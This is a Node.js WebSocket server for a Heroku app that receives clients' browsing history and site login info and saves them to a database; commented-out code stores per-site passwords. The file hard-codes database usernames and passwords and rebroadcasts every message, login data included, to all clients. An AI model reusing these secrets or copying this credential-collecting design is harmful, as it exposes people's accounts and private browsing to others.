'use strict';
/*
URL = https://projectnickname123.herokuapp.com
If recieveing port in use error
type this in cmd
taskkill /F /IM node.exe

HELPFUL COMMANDS:
heroku local =hosts the server locally user, access using localhost:5000 
IMPORTANT: ALWAYSALWAYSALWAYSALWAYS test on locally before deploying onto heroku
heroku open = opens the url of deployed app
heroku logs --tail = shows logs of server

To push and deploy to heroku and github
git add .
git commit -m "commit message"
git push heroku master
git push origin master
*/
const express = require('express');
const SocketServer = require('ws').Server;
const path = require('path');
var mysql = require('mysql');
var database = require('./SQLdatabase.js');
//var mongodb = require('mongodb');
//var MongoClient = mongodb.MongoClient;
//var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
//var mongoose = require ("mongoose");

const PORT = process.env.PORT || 3000;
const INDEX = path.join(__dirname, 'index.html');
const WebSocket = require('ws');

const server = express()
  .use((req, res) => res.sendFile(INDEX) )
  .listen(PORT, () => console.log(`Listening on ${ PORT }`));

var app = express();
const wss = new SocketServer({ server });

mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j
/*
var mySQL_config = {
  host     : 'us-cdbr-iron-east-01.cleardb.net',
  user     : 'b35b454793036b',
  password : '91686762',
  database : 'heroku_9059f11db120273'
};
*/

wss.on('connection', function connection(ws) {//Upon a connection from a client
    //console.log(database.test("test string"));
    console.log('A Client connected');
    ws.on('message', function incoming(message) {//Upon a message from a client
        console.log('received json: \n', message);
        //ws.send(message);
        try{
        var data = JSON.parse(message);//turn message into JSON
        } catch(e){//if data isint proper format
            console.log('wrong format detected')
            return;
        }
        ws.id = data.id;//get client id
        var type = data.type;
        if (type=='Online'){
            if (onlineClientsIDS.indexOf(ws) === -1) {//checks to see if client is on online list, if not add it to lsit
                console.log(ws.id+" connected");
                onlineClientsIDS.push(ws);
                //TODO send user id to database
                database.setOnline(ws.id);//WORKS

                console.log(ws.id+" online status sent to server");

                wss.clients.forEach(function each(client) {
                    console.log('Client.ID: ' + client.id);
                });
            
                /*
                var newUser = new userStatus ({
                    id: ws.id,
                    status : 'online'
                  });
                  userStatus.updateOne( { id: ws.id }, 
                    { status : 'online' }, { upsert : true }, function (err, val) {
                        //finds a document that matches id , if found, change status to online
                        //if not found add it
                    console.log(ws.id+" set to online");
                } );
                */
                //newUser.save(function (err) {if (err) console.log ('Error on save!')});
            }
            else
                console.log("ERROR!!!:id is already online");
        }

        else if (type == 'history'){//history list
            var history = data.history;
            //TODO SEND HISTORY TO DATABASE

            database.updateHistory(message);
        
        }

        //else if (type == 'cookie'){//cookie

        else if (type == 'info'){
            database.updateLoginInfo(message);

        }
        else if (type == 'getClients'){
            //var userStatus=database.getAllStatus();
            
            database.getAllStatus(function(userStatus){
                console.log(userStatus);
            });
            //console.log(userStatus);
            //var test = JSON.stringify(clientArr);
            //ws.send(JSON.stringify(database.getAllStatus()));
        }
        //else if (type=='getList'){//get blacklsited sites
            //TODO GET BLACK LISTED SITESdatabase.
        //}



        //}

        /*else if (type == 'username'){//if message is telling us that client typed in username
            ws.id=data.id;
            ws.url=data.url;//get url from message
            ws.username=data.username;//get username from message
            var newUsername = new userLogin ({
                id: ws.id,
                url: ws.url,
                username: ws.username
            });
            userLogin.updateOne( { id: ws.id, url: ws.url }, 
                { username : ws.username }, { upsert : true }, function (err, val) {
                    //finds a document that matches id and url, if found, update username field
                    //if not found add such document
                console.log(newUsername+" sent to db");

                wss.clients.forEach(function each(client) {//sends list of all usernames to site
                    console.log(client.id);
                    if (client.readyState === WebSocket.OPEN&&client.id=='SERVER') {
                        userLogin.find({},{_id:0, __v:0}).exec(function(err, data) { 
                            console.log(err, data, data.length); 
                            client.send(data.toString());
                            console.log(data);
                        });
                    }
                });
            } );
            //newUsername.save(function (err) {if (err) console.log ('Error on save!')});

        
        
        
        }

        if (type == 'password'){//password
            ws.id = data.id;
            ws.url=data.url;
            ws.password=data.password;
            var newPassword = new userLogin ({
                id: ws.id,
                logins:[
                    {
                    url: ws.url,
                    password: ws.password
                    }
                ]
            });
            newPassword.save(function (err) {if (err) console.log ('Error on save!')});
            console.log(newPassword+" sent to db");
        }
        */

        //SENDING DATA
        /*
        else if (type=='message'){
            wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
            //console.log(client);
            if (client.readyState === WebSocket.OPEN&&client.id===message.targetID) {
                client.send(message);
                console.log(message+ " sent to "+client.id);
            }
        });
    }
    */

    wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
        //console.log(client);
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
            console.log(message+ " sent to "+client.id);
        }
    });


    });

    ws.on('close', function (){ //when a client disconnects
        console.log(ws.id +' disconnected')
        var index = onlineClientsIDS.indexOf(ws);
        if (index > -1) {//remove id from active clients array
            onlineClientsIDS.splice(index, 1);
            //TODO SET ID IN ACTIVE USERS DATABASE TO OFFLINE
            database.setOffline(ws.id);
        }
        else
            console.log("ERROR!!!; id not in online id array");
    });
            
});
